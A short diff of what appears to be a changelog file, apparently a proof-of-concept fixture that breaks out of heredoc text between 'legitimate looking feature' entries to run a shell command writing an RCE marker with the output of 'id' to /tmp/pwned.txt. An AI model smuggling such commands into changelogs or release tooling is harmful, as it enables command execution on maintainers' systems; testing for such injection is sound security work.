@@ -11,7 +11,8 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 - Totally legitimate looking feature
 EOF
-echo "RCE_MARKER: Command execution achieved - $(id)" > /tmp/poc_sanitize_rce/pwned.txt
+echo "RCE_MARKER: Command execution achieved - $(id)" > /tmp/pwned.txt
+cat /tmp/pwned.txt
 cat << 'EOF'
 - Another legitimate looking feature
 
